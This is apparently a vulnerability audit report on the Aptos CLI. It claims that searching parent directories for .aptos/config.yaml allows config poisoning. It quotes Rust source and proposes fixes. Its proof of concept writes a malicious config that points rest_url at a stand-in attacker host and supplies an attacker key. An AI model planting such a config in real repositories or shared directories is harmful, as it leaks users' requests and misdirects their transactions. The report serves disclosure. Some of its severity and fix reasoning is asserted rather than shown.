# Audit Report

## Title
Configuration File Poisoning via Insecure Directory Search in Aptos CLI Profile Loading

## Summary
The Aptos CLI's profile loading mechanism searches for configuration files in the current directory and parent directories using `ConfigSearchMode::CurrentDirAndParents`. This allows an attacker to place a malicious `.aptos/config.yaml` file in a directory that will be loaded when a user runs CLI commands, enabling REST endpoint redirection attacks and unauthorized account operations. [1](#0-0) 

## Finding Description
The `get_transaction_account_type()` function loads user profiles by calling `CliConfig::load_profile()` with `ConfigSearchMode::CurrentDirAndParents`: [2](#0-1) 

This search mode is implemented in `find_workspace_config()` which traverses up the directory tree: [3](#0-2) 

The vulnerability manifests in multiple attack vectors:

**Attack Vector 1: Malicious REST Endpoint Redirection**

The profile's `rest_url` is loaded using the same insecure search mechanism: [4](#0-3) 

An attacker can redirect all REST API calls to a malicious server by placing a config file with a malicious `rest_url`.

**Attack Vector 2: Unauthorized Account Operations**

The profile's private key and account address are loaded for transaction signing: [5](#0-4) 

This allows an attacker to trick users into operating on attacker-controlled accounts.

**Exploitation Path:**

1. Attacker creates a malicious `.aptos/config.yaml`:
```yaml
profiles:
  default:
    rest_url: "https://attacker-server.com/v1"
    private_key: "0xATTACKER_KEY"
    account: "0xATTACKER_ACCOUNT"
```

2. Attacker places this file in:
   - A malicious GitHub repository
   - A shared directory (e.g., `/tmp/.aptos`)
   - Any directory where users might run CLI commands

3. When a user runs Aptos CLI commands from that directory (or subdirectories without their own config), the malicious configuration is loaded

4. All transactions are signed with the attacker's key and sent to the attacker's REST endpoint, enabling:
   - API request/response interception
   - Transaction manipulation
   - Fund redirection to attacker's account [6](#0-5) 

## Impact Explanation
This vulnerability meets **Medium Severity** criteria per the Aptos bug bounty program:

- **Limited funds loss**: Users may unknowingly fund the attacker's account when attempting to fund their own account
- **Information disclosure**: All API calls are redirected to the attacker's server, leaking transaction data, account queries, and potentially sensitive information
- **State confusion**: Users operate on wrong accounts without realizing it, potentially deploying contracts or transferring assets to unintended locations

While this does not directly affect consensus, validator nodes, or the blockchain protocol itself, it compromises the primary user interface to the Aptos blockchain and can lead to direct financial loss.

## Likelihood Explanation
**Likelihood: Medium to High**

The attack is highly practical:
- **No special privileges required**: Any attacker can create a malicious config file
- **Common attack scenarios**:
  - Malicious GitHub repositories with embedded config files
  - Compromised shared directories on multi-user systems
  - Social engineering: "Clone my repo and test this Move package"
- **User confusion**: The CLI provides no warning when loading configs from unexpected locations
- **Wide attack surface**: Affects all CLI commands that load profiles (move publish, account operations, governance commands, etc.)

The primary barrier is social engineering to get users into the malicious directory, but this is routinely successful in real-world attacks (e.g., malicious npm packages, compromised Python packages).

## Recommendation

**Immediate Fix: Restrict config search to trusted locations**

Modify the configuration loading logic to:
1. Only search in the current directory (not parents) by default
2. Add explicit warnings when loading configs from non-standard locations
3. Implement config file signature verification or checksums
4. Add a `--config-dir` flag for explicit config location specification

**Code Fix:**

Change the default search mode in security-sensitive contexts:

```rust
// In transactions.rs, line 100-101
} else if let Some(profile) = CliConfig::load_profile(
    self.profile_options.profile_name(),
    ConfigSearchMode::CurrentDir,  // Changed from CurrentDirAndParents
)? {
```

Add validation and warnings in `find_workspace_config()`:

```rust
fn find_workspace_config(
    starting_path: PathBuf,
    mode: ConfigSearchMode,
) -> CliTypedResult<PathBuf> {
    match mode {
        ConfigSearchMode::CurrentDir => Ok(starting_path.join(CONFIG_FOLDER)),
        ConfigSearchMode::CurrentDirAndParents => {
            let mut current_path = starting_path.clone();
            let original_path = starting_path.clone();
            
            loop {
                current_path.push(CONFIG_FOLDER);
                if current_path.is_dir() {
                    // Warn if config is found in parent directory
                    if current_path != original_path.join(CONFIG_FOLDER) {
                        eprintln!(
                            "⚠️  WARNING: Loading config from parent directory: {}",
                            current_path.display()
                        );
                        eprintln!("⚠️  This may be a security risk. Use --config-dir to specify explicitly.");
                    }
                    break Ok(current_path);
                } else if !(current_path.pop() && current_path.pop()) {
                    break Ok(starting_path.join(CONFIG_FOLDER));
                }
            }
        },
    }
}
```

**Long-term Fix:**
- Implement config file signing/verification
- Add per-command config location specification
- Consider moving to a global-only config model for security-sensitive operations

## Proof of Concept

**Setup:**
```bash
# Create malicious directory structure
mkdir /tmp/malicious_aptos_project
cd /tmp/malicious_aptos_project

# Create malicious config
mkdir .aptos
cat > .aptos/config.yaml << 'EOF'
profiles:
  default:
    rest_url: "https://attacker-logger.example.com/v1"
    private_key: "0x1111111111111111111111111111111111111111111111111111111111111111"
    account: "0xca843279e3427144cead5e4d5999a3d0"
EOF
```

**Exploitation:**
```bash
# Victim runs any Aptos CLI command
cd /tmp/malicious_aptos_project
aptos account list --profile default

# Expected: Uses victim's legitimate config
# Actual: Loads malicious config, sends API requests to attacker's server

# Verify by checking which REST endpoint is used:
aptos config show-profiles --profile default
# Output will show: rest_url: "https://attacker-logger.example.com/v1"
```

**Impact Demonstration:**
```bash
# User attempts to check their account balance
aptos account balance --account 0xUSER_ACCOUNT

# Instead:
# 1. Request goes to attacker's server (attacker-logger.example.com)
# 2. Attacker logs the request including account address
# 3. Attacker can return fake balance data
# 4. User receives manipulated information

# User attempts to fund account from faucet
aptos account fund-with-faucet --account 0xUSER_ACCOUNT

# Instead:
# 1. Transaction uses private key from malicious config (0x111...111)
# 2. Funds go to attacker's account (0xca8432...)
# 3. User believes they funded their own account
```

**Verification:**
To verify the vulnerability exists, run:
```bash
strace -e openat aptos config show-profiles 2>&1 | grep config.yaml
```
This will show the CLI searching for config files in parent directories, confirming the insecure search behavior.

---

**Notes:**
- This vulnerability affects ALL Aptos CLI commands that load profiles
- The `CurrentDirAndParents` search mode is used throughout the codebase, not just in `get_transaction_account_type()`
- Real-world exploitation vectors include malicious GitHub repositories and compromised shared filesystems
- The lack of user warnings when loading configs from unexpected locations significantly increases exploitability

### Citations

**File:** crates/aptos/src/common/transactions.rs (L99-107)
```rust
        } else if let Some(profile) = CliConfig::load_profile(
            self.profile_options.profile_name(),
            ConfigSearchMode::CurrentDirAndParents,
        )? {
            if profile.private_key.is_some() {
                Ok(AccountType::Local)
            } else {
                Ok(AccountType::HardwareWallet)
            }
```

**File:** crates/aptos/src/config/mod.rs (L393-412)
```rust
fn find_workspace_config(
    starting_path: PathBuf,
    mode: ConfigSearchMode,
) -> CliTypedResult<PathBuf> {
    match mode {
        ConfigSearchMode::CurrentDir => Ok(starting_path.join(CONFIG_FOLDER)),
        ConfigSearchMode::CurrentDirAndParents => {
            let mut current_path = starting_path.clone();
            loop {
                current_path.push(CONFIG_FOLDER);
                if current_path.is_dir() {
                    break Ok(current_path);
                } else if !(current_path.pop() && current_path.pop()) {
                    // If we aren't able to find the folder, we'll create a new one right here
                    break Ok(starting_path.join(CONFIG_FOLDER));
                }
            }
        },
    }
}
```

**File:** crates/aptos/src/common/types.rs (L933-946)
```rust
        } else if let Some((Some(key), maybe_config_address)) = CliConfig::load_profile(
            profile.profile_name(),
            ConfigSearchMode::CurrentDirAndParents,
        )?
        .map(|p| (p.private_key, p.account))
        {
            match (maybe_address, maybe_config_address) {
                (Some(address), _) => Ok((key, address)),
                (_, Some(address)) => Ok((key, address)),
                (None, None) => {
                    let address = account_address_from_public_key(&key.public_key());
                    Ok((key, address))
                },
            }
```

**File:** crates/aptos/src/common/types.rs (L1135-1145)
```rust
        } else if let Some(Some(url)) = CliConfig::load_profile(
            profile.profile_name(),
            ConfigSearchMode::CurrentDirAndParents,
        )?
        .map(|p| p.rest_url)
        {
            reqwest::Url::parse(&url)
                .map_err(|err| CliError::UnableToParse("Rest URL", err.to_string()))
        } else {
            Err(CliError::CommandArgumentError("No rest url given.  Please add --url or add a rest_url to the .aptos/config.yaml for the current profile".to_string()))
        }
```

**File:** crates/aptos/src/common/types.rs (L2051-2061)
```rust
        let transaction = match self.get_transaction_account_type() {
            Ok(AccountType::Local) => {
                let (private_key, _) = self.get_key_and_address()?;
                let sender_account =
                    &mut LocalAccount::new(sender_address, private_key, sequence_number);
                let mut txn_builder = transaction_factory.payload(payload);
                if self.replay_protection_type == ReplayProtectionType::Nonce {
                    let mut rng = rand::thread_rng();
                    txn_builder = txn_builder.upgrade_payload_with_rng(&mut rng, true, true);
                };
                sender_account.sign_with_transaction_builder(txn_builder)
```
